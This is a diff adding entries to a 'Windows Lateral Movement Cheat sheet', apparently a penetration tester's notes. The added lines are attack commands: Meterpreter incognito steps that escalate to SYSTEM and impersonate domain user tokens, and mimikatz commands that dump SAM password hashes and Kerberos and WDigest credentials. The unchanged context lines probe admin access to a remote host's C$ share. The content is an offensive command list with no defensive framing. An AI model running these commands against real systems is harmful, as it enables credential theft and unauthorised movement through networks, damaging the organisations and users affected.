@@ -1,4 +1,25 @@
-Windows Lateral Movement Cheat sheet
+#
+#Windows Lateral Movement Cheat sheet
+#
+#INCOGNITO
+getsystem
+use incognito
+list_tokens -u
+impersonate_token [DOMAIN]\\[USER]
+getuid
+
+----------------------------------------
+
+#MIMIKATZ
+getsystem
+load mimikatz
+msv
+kerberos
+mimikatz_command -f samdump::hashes
+wdigest
+
+----------------------------------------
+
 #check if admin access
 dir \\[HOST]\C$
 #check the time on remote server
